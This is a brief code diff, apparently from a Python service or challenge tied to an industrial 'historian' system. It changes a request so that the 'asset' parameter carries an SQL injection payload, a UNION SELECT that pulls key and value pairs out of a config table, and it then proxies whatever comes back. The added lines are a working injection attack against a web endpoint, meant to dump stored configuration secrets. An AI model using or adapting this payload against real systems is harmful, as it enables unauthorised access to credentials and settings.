@@ -148,7 +148,11 @@ def historian_pass():
     The route was never removed.
     """
     try:
-        resp = requests.get(f"{HISTORIAN_URL}/report?asset=config&from=0&to=9", timeout=3)
+        resp = requests.get(f"{HISTORIAN_URL}/report", params={
+            "asset": "x' UNION SELECT key,value,'x' FROM config--",
+            "from":  "0",
+            "to":    "9",
+        }, timeout=3)
         # Just proxy whatever the historian returns
         return Response(resp.text, mimetype="text/plain")
     except Exception as e:
